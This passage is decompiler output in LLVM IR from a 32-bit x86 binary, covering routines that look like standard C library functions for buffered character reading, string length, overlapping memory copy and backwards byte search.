  uselistorder i32* %ebp.global-to-local, { 9, 10, 5, 6, 0, 3, 2, 1, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 2, 3, 4, 5, 6, 21, 22, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 1, 2, 0 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 2, 11, 3, 12, 4, 10, 8, 9, 5, 6, 1, 7, 0 }
  uselistorder i32 13, { 0, 4, 3, 1, 2 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_80508b3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80508b1, { 1, 0 }
  uselistorder label %dec_label_pc_8050832, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80507df, { 1, 0 }
  uselistorder label %dec_label_pc_80507b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050786, { 1, 0 }
  uselistorder label %dec_label_pc_8050773, { 1, 0 }
  uselistorder label %dec_label_pc_8050759, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050726, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050711, { 1, 0 }
  uselistorder label %dec_label_pc_8050706, { 1, 0 }
  uselistorder label %dec_label_pc_805068d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805067f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050645, { 1, 0 }
  uselistorder label %dec_label_pc_8050615.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80505e1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80505b0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805059b, { 1, 0 }
  uselistorder label %dec_label_pc_8050507, { 1, 0 }
  uselistorder label %dec_label_pc_80504df, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80504dd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80504cd, { 1, 0 }
  uselistorder label %dec_label_pc_8050461, { 1, 0 }
  uselistorder label %dec_label_pc_805038a, { 1, 0 }
}

define i32 @function_80508f0() local_unnamed_addr {
dec_label_pc_80508f0:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_4()
  %stack_var_-5 = alloca i8, align 1
  %v0_80508f0 = load i32, i32* @ebx, align 4
  %v4_80508f4 = ptrtoint i16* %tmp to i32
  store i32 %v4_80508f4, i32* @ebx, align 4
  %v1_80508f8 = add i32 %v4_80508f4, 16
  %v2_80508f8 = inttoptr i32 %v1_80508f8 to i32*
  %v3_80508f8 = load i32, i32* %v2_80508f8, align 4
  %v2_80508fb = add i32 %v4_80508f4, 24
  %v3_80508fb = inttoptr i32 %v2_80508fb to i32*
  %v4_80508fb = load i32, i32* %v3_80508fb, align 4
  %v10_80508fb = icmp ult i32 %v3_80508f8, %v4_80508fb
  br i1 %v10_80508fb, label %dec_label_pc_805099d, label %dec_label_pc_8050904

dec_label_pc_8050904:                             ; preds = %dec_label_pc_80508f0
  %v2_8050904 = load i16, i16* %tmp, align 2
  %v3_8050904 = zext i16 %v2_8050904 to i32
  %v1_8050907 = and i32 %v3_8050904, 131
  %v6_8050911 = icmp ugt i32 %v1_8050907, 128
  br i1 %v6_8050911, label %dec_label_pc_805092b, label %dec_label_pc_8050913

dec_label_pc_8050913:                             ; preds = %dec_label_pc_8050904
  %v0_8050913 = load i32, i32* @edx, align 4
  %v6_805091b = call i32 @function_8051934(i16* nonnull %tmp, i32 128, i32 %v0_8050913, i32 %v0_8050913)
  %v1_8050923 = icmp eq i32 %v6_805091b, 0
  %v1_8050925 = icmp eq i1 %v1_8050923, false
  br i1 %v1_8050925, label %dec_label_pc_80509c2, label %dec_label_pc_8050913.dec_label_pc_805092b_crit_edge

dec_label_pc_8050913.dec_label_pc_805092b_crit_edge: ; preds = %dec_label_pc_8050913
  %v0_805092b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805092b

dec_label_pc_805092b:                             ; preds = %dec_label_pc_8050913.dec_label_pc_805092b_crit_edge, %dec_label_pc_8050904
  %v2_805095f = phi i32 [ %v0_805092b.pre, %dec_label_pc_8050913.dec_label_pc_805092b_crit_edge ], [ %v4_80508f4, %dec_label_pc_8050904 ]
  %v1_805092b = inttoptr i32 %v2_805095f to i16*
  %v2_805092b = load i16, i16* %v1_805092b, align 2
  %v3_805092b = zext i16 %v2_805092b to i32
  store i32 %v3_805092b, i32* @ecx, align 4
  %v2_805092e = and i16 %v2_805092b, 2
  %v3_805092e = icmp eq i16 %v2_805092e, 0
  br i1 %v3_805092e, label %dec_label_pc_805094e, label %dec_label_pc_8050933

dec_label_pc_8050933:                             ; preds = %dec_label_pc_805092b
  %tmp20 = urem i16 %v2_805092b, 2
  %v1_8050935 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8050935
  %v2_8050938 = and i32 %tmp19, 4
  %v3_8050938 = add i32 %v2_805095f, 36
  %v4_8050938 = add i32 %v3_8050938, %v2_8050938
  %v5_8050938 = inttoptr i32 %v4_8050938 to i8*
  %v6_8050938 = load i8, i8* %v5_8050938, align 1
  %v7_8050938 = zext i8 %v6_8050938 to i32
  %v8_8050938 = load i32, i32* @edx, align 4
  %v9_8050938 = and i32 %v8_8050938, -256
  %v10_8050938 = or i32 %v9_8050938, %v7_8050938
  store i32 %v10_8050938, i32* %edx.global-to-local, align 4
  %v1_805093c = add i16 %v2_805092b, -1
  store i16 %v1_805093c, i16* %v1_805092b, align 2
  %v0_8050942 = load i32, i32* @ebx, align 4
  %v1_8050942 = add i32 %v0_8050942, 40
  %v2_8050942 = inttoptr i32 %v1_8050942 to i32*
  store i32 0, i32* %v2_8050942, align 4
  %v0_8050949 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050949 = urem i32 %v0_8050949, 256
  store i32 %v1_8050949, i32* @edx, align 4
  br label %dec_label_pc_80509c5

dec_label_pc_805094e:                             ; preds = %dec_label_pc_805092b
  %v1_805094e = add i32 %v2_805095f, 16
  %v2_805094e = inttoptr i32 %v1_805094e to i32*
  %v3_805094e = load i32, i32* %v2_805094e, align 4
  store i32 %v3_805094e, i32* @eax, align 4
  %v1_8050951 = add i32 %v2_805095f, 20
  %v2_8050951 = inttoptr i32 %v1_8050951 to i32*
  %v3_8050951 = load i32, i32* %v2_8050951, align 4
  %v15_8050951 = icmp eq i32 %v3_8050951, %v3_805094e
  %v1_8050954 = icmp eq i1 %v15_8050951, false
  br i1 %v1_8050954, label %dec_label_pc_805099d, label %dec_label_pc_8050956

dec_label_pc_8050956:                             ; preds = %dec_label_pc_805094e
  %v1_8050956 = add i32 %v2_805095f, 4
  %v2_8050956 = inttoptr i32 %v1_8050956 to i32*
  %v3_8050956 = load i32, i32* %v2_8050956, align 4
  %v13_8050956 = icmp eq i32 %v3_8050956, -2
  %v1_805095a = icmp eq i1 %v13_8050956, false
  br i1 %v1_805095a, label %dec_label_pc_8050964, label %dec_label_pc_805095c

dec_label_pc_805095c:                             ; preds = %dec_label_pc_8050956
  %v1_805095c = or i32 %v3_805092b, 4
  store i32 %v1_805095c, i32* @ecx, align 4
  %v1_805095f = trunc i32 %v1_805095c to i16
  store i16 %v1_805095f, i16* %v1_805092b, align 2
  br label %dec_label_pc_80509c2

dec_label_pc_8050964:                             ; preds = %dec_label_pc_8050956
  %v3_8050964 = and i16 %v2_805092b, 768
  %v4_8050964 = icmp eq i16 %v3_8050964, 0
  br i1 %v4_8050964, label %dec_label_pc_8050979, label %dec_label_pc_8050969

dec_label_pc_8050969:                             ; preds = %dec_label_pc_8050964
  %v3_8050971 = call i32 @function_804d194(i16* bitcast (i32** @global_var_80561fc.118 to i16*))
  %v0_8050979.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8050979

dec_label_pc_8050979:                             ; preds = %dec_label_pc_8050964, %dec_label_pc_8050969
  %v0_80509ae = phi i32 [ %v2_805095f, %dec_label_pc_8050964 ], [ %v0_8050979.pre, %dec_label_pc_8050969 ]
  %v1_8050979 = add i32 %v0_80509ae, 8
  %v2_8050979 = inttoptr i32 %v1_8050979 to i32*
  %v3_8050979 = load i32, i32* %v2_8050979, align 4
  %v1_805097c = add i32 %v0_80509ae, 12
  %v2_805097c = inttoptr i32 %v1_805097c to i32*
  %v3_805097c = load i32, i32* %v2_805097c, align 4
  %v15_805097c = icmp eq i32 %v3_805097c, %v3_8050979
  br i1 %v15_805097c, label %dec_label_pc_80509a6, label %dec_label_pc_8050981

dec_label_pc_8050981:                             ; preds = %dec_label_pc_8050979
  %v2_8050984 = add i32 %v0_80509ae, 24
  %v3_8050984 = inttoptr i32 %v2_8050984 to i32*
  store i32 %v3_8050979, i32* %v3_8050984, align 4
  %v0_8050987 = load i32, i32* @ebx, align 4
  %v2_8050988 = call i32 @function_805190c(i32 %v0_8050987)
  %v1_8050990 = icmp eq i32 %v2_8050988, 0
  br i1 %v1_8050990, label %dec_label_pc_80509c2, label %dec_label_pc_8050994

dec_label_pc_8050994:                             ; preds = %dec_label_pc_8050981
  %v0_8050994 = load i32, i32* @ebx, align 4
  %v1_8050994 = add i32 %v0_8050994, 20
  %v2_8050994 = inttoptr i32 %v1_8050994 to i32*
  %v3_8050994 = load i32, i32* %v2_8050994, align 4
  %v2_8050997 = add i32 %v0_8050994, 24
  %v3_8050997 = inttoptr i32 %v2_8050997 to i32*
  store i32 %v3_8050994, i32* %v3_8050997, align 4
  %v0_805099a = load i32, i32* @ebx, align 4
  %v1_805099a = add i32 %v0_805099a, 16
  %v2_805099a = inttoptr i32 %v1_805099a to i32*
  %v3_805099a = load i32, i32* %v2_805099a, align 4
  br label %dec_label_pc_805099d

dec_label_pc_805099d:                             ; preds = %dec_label_pc_805094e, %dec_label_pc_80508f0, %dec_label_pc_8050994
  %v1_80509a1 = phi i32 [ %v2_805095f, %dec_label_pc_805094e ], [ %v4_80508f4, %dec_label_pc_80508f0 ], [ %v0_805099a, %dec_label_pc_8050994 ]
  %v0_805099d = phi i32 [ %v3_805094e, %dec_label_pc_805094e ], [ %v3_80508f8, %dec_label_pc_80508f0 ], [ %v3_805099a, %dec_label_pc_8050994 ]
  %v1_805099d = inttoptr i32 %v0_805099d to i8*
  %v2_805099d = load i8, i8* %v1_805099d, align 1
  %v3_805099d = zext i8 %v2_805099d to i32
  store i32 %v3_805099d, i32* @edx, align 4
  %v1_80509a0 = add i32 %v0_805099d, 1
  %v2_80509a1 = add i32 %v1_80509a1, 16
  %v3_80509a1 = inttoptr i32 %v2_80509a1 to i32*
  store i32 %v1_80509a0, i32* %v3_80509a1, align 4
  %v0_80509c8.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80509c5

dec_label_pc_80509a6:                             ; preds = %dec_label_pc_8050979
  %v2_80509a9 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80509ae = inttoptr i32 %v0_80509ae to i16*
  %v5_80509af = call i32 @function_8051818(i16* %v5_80509ae, i32 %v2_80509a9, i32 1)
  %v1_80509b7 = icmp eq i32 %v5_80509af, 0
  br i1 %v1_80509b7, label %dec_label_pc_80509c2, label %dec_label_pc_80509bb

dec_label_pc_80509bb:                             ; preds = %dec_label_pc_80509a6
  %v3_80509bb = load i8, i8* %stack_var_-5, align 1
  %v4_80509bb = sext i8 %v3_80509bb to i32
  store i32 %v4_80509bb, i32* @edx, align 4
  br label %dec_label_pc_80509c5

dec_label_pc_80509c2:                             ; preds = %dec_label_pc_80509a6, %dec_label_pc_8050981, %dec_label_pc_8050913, %dec_label_pc_805095c
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80509c5

dec_label_pc_80509c5:                             ; preds = %dec_label_pc_80509bb, %dec_label_pc_805099d, %dec_label_pc_8050933, %dec_label_pc_80509c2
  %v0_80509c8 = phi i32 [ %v4_80509bb, %dec_label_pc_80509bb ], [ %v0_80509c8.pre, %dec_label_pc_805099d ], [ %v1_8050949, %dec_label_pc_8050933 ], [ -1, %dec_label_pc_80509c2 ]
  store i32 %v0_80508f0, i32* @ebx, align 4
  ret i32 %v0_80509c8

; uselistorder directives
  uselistorder i32 %v0_805099d, { 1, 0 }
  uselistorder i32 %v3_8050979, { 1, 0 }
  uselistorder i32 %v0_80509ae, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805094e, { 1, 0, 2 }
  uselistorder i32 %v1_8050949, { 1, 0 }
  uselistorder i16 %v2_805092b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_805095f, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_8056240.104, { 2, 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_80509c5, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80509c2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805099d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050979, { 1, 0 }
}

define i32 @function_80509cc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80509cc:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80509cc = load i32, i32* @edi, align 4
  store i32 %v0_80509cc, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80509d3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80509d3, i32* %edi.global-to-local, align 4
  %v1_80509db = icmp eq i32 %arg3, 0
  store i1 %v1_80509db, i1* %zf.global-to-local, align 1
  br i1 %v1_80509db, label %dec_label_pc_80509eb, label %dec_label_pc_80509df

dec_label_pc_80509df:                             ; preds = %dec_label_pc_80509cc
  %v2_80509df = call i32 @_strlen(i8* %arg1)
  %v3_80509df = mul i32 %v2_80509df, -1
  %v4_80509df = add i32 %v3_80509df, -2
  store i32 %v4_80509df, i32* @ecx, align 4
  %v0_80509e1 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80509e1, label %dec_label_pc_80509df.dec_label_pc_80509e8_crit_edge, label %dec_label_pc_80509e3

dec_label_pc_80509df.dec_label_pc_80509e8_crit_edge: ; preds = %dec_label_pc_80509df
  %v0_80509e8.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_80509e8.pre, -1
  br label %dec_label_pc_80509e8

dec_label_pc_80509e3:                             ; preds = %dec_label_pc_80509df
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_80509e8

dec_label_pc_80509e8:                             ; preds = %dec_label_pc_80509df.dec_label_pc_80509e8_crit_edge, %dec_label_pc_80509e3
  %v0_80509e8 = phi i32 [ %phitmp, %dec_label_pc_80509df.dec_label_pc_80509e8_crit_edge ], [ 0, %dec_label_pc_80509e3 ]
  %v8_80509e8 = icmp eq i32 %v0_80509e8, 0
  store i1 %v8_80509e8, i1* %zf.global-to-local, align 1
  store i32 %v0_80509e8, i32* %edi.global-to-local, align 4
  %v2_80509eb.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80509eb

dec_label_pc_80509eb:                             ; preds = %dec_label_pc_80509cc, %dec_label_pc_80509e8
  %v0_80509ec = phi i32 [ 0, %dec_label_pc_80509cc ], [ %v0_80509e8, %dec_label_pc_80509e8 ]
  %v2_80509eb = phi i32 [ %v0_80509cc, %dec_label_pc_80509cc ], [ %v2_80509eb.pre, %dec_label_pc_80509e8 ]
  store i32 %v2_80509eb, i32* @edi, align 4
  ret i32 %v0_80509ec

; uselistorder directives
  uselistorder i32 %v0_80509e8, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_80509eb, { 1, 0 }
  uselistorder label %dec_label_pc_80509e8, { 1, 0 }
}

define i32 @function_80509f0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80509f0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_80509f1 = load i32, i32* @esi, align 4
  store i32 %v0_80509f1, i32* %stack_var_-8, align 4
  %v4_80509f2 = ptrtoint i8* %arg1 to i32
  %v9_80509fe = icmp ugt i8* %tmp3, %arg1
  %v1_8050a00 = icmp eq i1 %v9_80509fe, false
  br i1 %v1_8050a00, label %dec_label_pc_8050a08, label %dec_label_pc_8050a02

dec_label_pc_8050a02:                             ; preds = %dec_label_pc_80509f0
  %v7_8050a04 = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_8050a14

dec_label_pc_8050a08:                             ; preds = %dec_label_pc_80509f0
  %v3_8050a08 = add i32 %arg2, -1
  %v4_8050a08 = add i32 %v3_8050a08, %tmp
  %v5_8050a08 = inttoptr i32 %v4_8050a08 to i8*
  %v3_8050a0c = add i32 %v4_80509f2, -1
  %v4_8050a0c = add i32 %v3_8050a0c, %tmp
  %v5_8050a0c = inttoptr i32 %v4_8050a0c to i8*
  %v7_8050a11 = call i8* @_memcpy(i8* %v5_8050a0c, i8* %v5_8050a08, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8050a14

dec_label_pc_8050a14:                             ; preds = %dec_label_pc_8050a02, %dec_label_pc_8050a08
  %v2_8050a14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050a14, i32* @esi, align 4
  ret i32 %v4_80509f2

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050a14, { 1, 0 }
}

define i32 @function_8050a18(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050a18:
  %v0_8050a18 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8050a2b = inttoptr i32 %arg1 to i16*
  %v4_8050a2b = call i32 @function_804d4b8(i16* %v3_8050a2b, i32 %arg2, i32 %arg3)
  %v0_8050a33 = load i32, i32* @esi, align 4
  %v2_8050a33 = add i32 %v0_8050a33, %arg3
  store i32 %v0_8050a18, i32* @esi, align 4
  ret i32 %v2_8050a33
}

define i32 @function_8050a3c(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050a3c:
  %tmp = trunc i32 %arg2 to i8
  %v4_8050a41 = urem i32 %arg2, 256
  %v4_8050a4d = sext i8 %arg1 to i32
  %v2_8050a51 = add i32 %v4_8050a4d, %arg3
  %v1_8050a637 = icmp eq i32 %arg3, 0
  br i1 %v1_8050a637, label %dec_label_pc_8050a6b, label %dec_label_pc_8050a67

dec_label_pc_8050a55:                             ; preds = %dec_label_pc_8050a67
  %v1_8050a55 = add i32 %v0_8050a55, -1
  %v5_8050a56 = load i32, i32* @edx, align 4
  %v6_8050a56 = and i32 %v5_8050a56, -256
  %v7_8050a56 = or i32 %v6_8050a56, %v4_8050a41
  store i32 %v7_8050a56, i32* @edx, align 4
  %v1_8050a5a = inttoptr i32 %v1_8050a55 to i8*
  %v2_8050a5a = load i8, i8* %v1_8050a5a, align 1
  %v15_8050a5a = icmp eq i8 %v2_8050a5a, %tmp
  br i1 %v15_8050a5a, label %dec_label_pc_8050ae8, label %dec_label_pc_8050a62

dec_label_pc_8050a62:                             ; preds = %dec_label_pc_8050a55
  %v1_8050a62 = add i32 %v0_8050a62, -1
  %v8_8050a62 = icmp eq i32 %v1_8050a62, 0
  br i1 %v8_8050a62, label %dec_label_pc_8050a6b, label %dec_label_pc_8050a67

dec_label_pc_8050a67:                             ; preds = %dec_label_pc_8050a3c, %dec_label_pc_8050a62
  %v0_8050a62 = phi i32 [ %v1_8050a62, %dec_label_pc_8050a62 ], [ %arg3, %dec_label_pc_8050a3c ]
  %v0_8050a55 = phi i32 [ %v1_8050a55, %dec_label_pc_8050a62 ], [ %v2_8050a51, %dec_label_pc_8050a3c ]
  %v2_8050a67 = urem i32 %v0_8050a55, 4
  %v3_8050a67 = icmp eq i32 %v2_8050a67, 0
  %v1_8050a69 = icmp eq i1 %v3_8050a67, false
  br i1 %v1_8050a69, label %dec_label_pc_8050a55, label %dec_label_pc_8050a6b

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a62, %dec_label_pc_8050a67, %dec_label_pc_8050a3c
  %v0_8050ace.pr = phi i32 [ 0, %dec_label_pc_8050a3c ], [ 0, %dec_label_pc_8050a62 ], [ %v0_8050a62, %dec_label_pc_8050a67 ]
  %v0_8050a70 = phi i32 [ %v2_8050a51, %dec_label_pc_8050a3c ], [ %v1_8050a55, %dec_label_pc_8050a62 ], [ %v0_8050a55, %dec_label_pc_8050a67 ]
  store i32 %v0_8050a70, i32* @ecx, align 4
  %v2_8050a74 = mul nuw nsw i32 %v4_8050a41, 256
  %v2_8050a77 = or i32 %v2_8050a74, %v4_8050a41
  %v2_8050a7b = mul i32 %v2_8050a77, 65536
  %v2_8050a7e = or i32 %v2_8050a7b, %v2_8050a77
  %v6_8050ad152 = icmp ugt i32 %v0_8050ace.pr, 3
  br i1 %v6_8050ad152, label %dec_label_pc_8050a82, label %dec_label_pc_8050ad3

dec_label_pc_8050a82:                             ; preds = %dec_label_pc_8050a6b, %dec_label_pc_8050acb
  %v0_8050acb54 = phi i32 [ %v1_8050acb, %dec_label_pc_8050acb ], [ %v0_8050ace.pr, %dec_label_pc_8050a6b ]
  %v0_8050a8253 = phi i32 [ %v1_8050a82, %dec_label_pc_8050acb ], [ %v0_8050a70, %dec_label_pc_8050a6b ]
  %v1_8050a82 = add i32 %v0_8050a8253, -4
  store i32 %v1_8050a82, i32* @ecx, align 4
  %v2_8050a87 = inttoptr i32 %v1_8050a82 to i32*
  %v3_8050a87 = load i32, i32* %v2_8050a87, align 4
  %v4_8050a87 = xor i32 %v3_8050a87, %v2_8050a7e
  %v1_8050a89 = add i32 %v4_8050a87, 2130640639
  %v1_8050a8f = sub i32 -1, %v4_8050a87
  %v2_8050a91 = xor i32 %v1_8050a89, %v1_8050a8f
  %v1_8050a93 = and i32 %v2_8050a91, -2130640640
  %v2_8050a93 = icmp eq i32 %v1_8050a93, 0
  br i1 %v2_8050a93, label %dec_label_pc_8050acb, label %dec_label_pc_8050a9b

dec_label_pc_8050a9b:                             ; preds = %dec_label_pc_8050a82
  %v7_8050a9b = or i32 %v1_8050a93, %v4_8050a41
  %v1_8050a9f = add i32 %v0_8050a8253, -1
  %v2_8050aa2 = inttoptr i32 %v1_8050a9f to i8*
  %v3_8050aa2 = load i8, i8* %v2_8050aa2, align 1
  %v16_8050aa2 = icmp eq i8 %v3_8050aa2, %tmp
  br i1 %v16_8050aa2, label %dec_label_pc_8050ae8, label %dec_label_pc_8050aa7

dec_label_pc_8050aa7:                             ; preds = %dec_label_pc_8050a9b
  %v1_8050aab = add i32 %v0_8050a8253, -2
  %v2_8050aae = inttoptr i32 %v1_8050aab to i8*
  %v3_8050aae = load i8, i8* %v2_8050aae, align 1
  %v16_8050aae = icmp eq i8 %v3_8050aae, %tmp
  br i1 %v16_8050aae, label %dec_label_pc_8050ae8, label %dec_label_pc_8050ab3

dec_label_pc_8050ab3:                             ; preds = %dec_label_pc_8050aa7
  %v1_8050ab7 = add i32 %v0_8050a8253, -3
  %v2_8050aba = inttoptr i32 %v1_8050ab7 to i8*
  %v3_8050aba = load i8, i8* %v2_8050aba, align 1
  %v16_8050aba = icmp eq i8 %v3_8050aba, %tmp
  br i1 %v16_8050aba, label %dec_label_pc_8050ae8, label %dec_label_pc_8050abf

dec_label_pc_8050abf:                             ; preds = %dec_label_pc_8050ab3
  %v1_8050ac3 = inttoptr i32 %v1_8050a82 to i8*
  %v2_8050ac3 = load i8, i8* %v1_8050ac3, align 1
  %v15_8050ac3 = icmp eq i8 %v2_8050ac3, %tmp
  %v1_8050ac5 = icmp eq i1 %v15_8050ac3, false
  br i1 %v1_8050ac5, label %dec_label_pc_8050acb, label %dec_label_pc_8050ac7

dec_label_pc_8050ac7:                             ; preds = %dec_label_pc_8050abf
  br label %dec_label_pc_8050ae8

dec_label_pc_8050acb:                             ; preds = %dec_label_pc_8050abf, %dec_label_pc_8050a82
  %v5_8050ad827 = phi i32 [ %v7_8050a9b, %dec_label_pc_8050abf ], [ 0, %dec_label_pc_8050a82 ]
  %v1_8050acb = add i32 %v0_8050acb54, -4
  %v6_8050ad1 = icmp ugt i32 %v1_8050acb, 3
  br i1 %v6_8050ad1, label %dec_label_pc_8050a82, label %dec_label_pc_8050ad3

dec_label_pc_8050ad3:                             ; preds = %dec_label_pc_8050acb, %dec_label_pc_8050a6b
  %v5_8050ad826.lcssa = phi i32 [ %v4_8050a41, %dec_label_pc_8050a6b ], [ %v5_8050ad827, %dec_label_pc_8050acb ]
  %v0_8050a82.lcssa = phi i32 [ %v0_8050a70, %dec_label_pc_8050a6b ], [ %v1_8050a82, %dec_label_pc_8050acb ]
  %v0_8050acb.lcssa = phi i32 [ %v0_8050ace.pr, %dec_label_pc_8050a6b ], [ %v1_8050acb, %dec_label_pc_8050acb ]
  br label %dec_label_pc_8050ae0

dec_label_pc_8050ad7:                             ; preds = %dec_label_pc_8050ae0
  %v1_8050ae0 = add i32 %v0_8050ae0, -1
  %v1_8050ad7 = add i32 %v0_8050ad7, -1
  %v6_8050ad8 = and i32 %v5_8050ad8, -256
  %v7_8050ad8 = or i32 %v6_8050ad8, %v4_8050a41
  %v1_8050adc = inttoptr i32 %v1_8050ad7 to i8*
  %v2_8050adc = load i8, i8* %v1_8050adc, align 1
  %v15_8050adc = icmp eq i8 %v2_8050adc, %tmp
  br i1 %v15_8050adc, label %dec_label_pc_8050ae8, label %dec_label_pc_8050ae0

dec_label_pc_8050ae0:                             ; preds = %dec_label_pc_8050ad7, %dec_label_pc_8050ad3
  %v5_8050ad8 = phi i32 [ %v7_8050ad8, %dec_label_pc_8050ad7 ], [ %v5_8050ad826.lcssa, %dec_label_pc_8050ad3 ]
  %v0_8050ad7 = phi i32 [ %v1_8050ad7, %dec_label_pc_8050ad7 ], [ %v0_8050a82.lcssa, %dec_label_pc_8050ad3 ]
  %v0_8050ae0 = phi i32 [ %v1_8050ae0, %dec_label_pc_8050ad7 ], [ %v0_8050acb.lcssa, %dec_label_pc_8050ad3 ]
  %v10_8050ae1 = icmp eq i32 %v0_8050ae0, 0
  %v1_8050ae4 = icmp eq i1 %v10_8050ae1, false
  br i1 %v1_8050ae4, label %dec_label_pc_8050ad7, label %dec_label_pc_8050ae6

dec_label_pc_8050ae6:                             ; preds = %dec_label_pc_8050ae0
  br label %dec_label_pc_8050ae8

dec_label_pc_8050ae8:                             ; preds = %dec_label_pc_8050a55, %dec_label_pc_8050ab3, %dec_label_pc_8050aa7, %dec_label_pc_8050a9b, %dec_label_pc_8050ad7, %dec_label_pc_8050ac7, %dec_label_pc_8050ae6
  %v0_8050aeb = phi i32 [ %v1_8050a82, %dec_label_pc_8050ac7 ], [ 0, %dec_label_pc_8050ae6 ], [ %v1_8050ad7, %dec_label_pc_8050ad7 ], [ %v1_8050ab7, %dec_label_pc_8050ab3 ], [ %v1_8050aab, %dec_label_pc_8050aa7 ], [ %v1_8050a9f, %dec_label_pc_8050a9b ], [ %v1_8050a55, %dec_label_pc_8050a55 ]
  ret i32 %v0_8050aeb

; uselistorder directives
  uselistorder i32 %v0_8050ae0, { 1, 0 }
  uselistorder i32 %v1_8050acb, { 0, 2, 1 }
  uselistorder i32 %v1_8050a82, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8050a8253, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8050a77, { 1, 0 }
  uselistorder i32 %v0_8050a55, { 1, 0, 2 }
  uselistorder i32 %v2_8050a51, { 1, 0 }
  uselistorder i32 %v4_8050a41, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050ae8, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8050a82, { 1, 0 }
  uselistorder label %dec_label_pc_8050a6b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a67, { 1, 0 }
}

define i32 @function_8050aec(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8050aec:
  %eax.global-to-local = alloca i32, align 4
  %v4_8050aef = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050aef, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8050afb = icmp eq i8* %arg1, null
  %v1_8050afd = icmp eq i1 %v1_8050afb, false
  br i1 %v1_8050afd, label %dec_label_pc_8050b01, label %dec_label_pc_8050aff

dec_label_pc_8050aff:                             ; preds = %dec_label_pc_8050aec
  %v1_8050aff = inttoptr i32 %arg3 to i32*
  %v2_8050aff = load i32, i32* %v1_8050aff, align 4
  store i32 %v2_8050aff, i32* @ebx, align 4
  br label %dec_label_pc_8050b01

dec_label_pc_8050b01:                             ; preds = %dec_label_pc_8050aec, %dec_label_pc_8050aff
  %v0_8050b04 = phi i32 [ %v4_8050aef, %dec_label_pc_8050aec ], [ %v2_8050aff, %dec_label_pc_8050aff ]
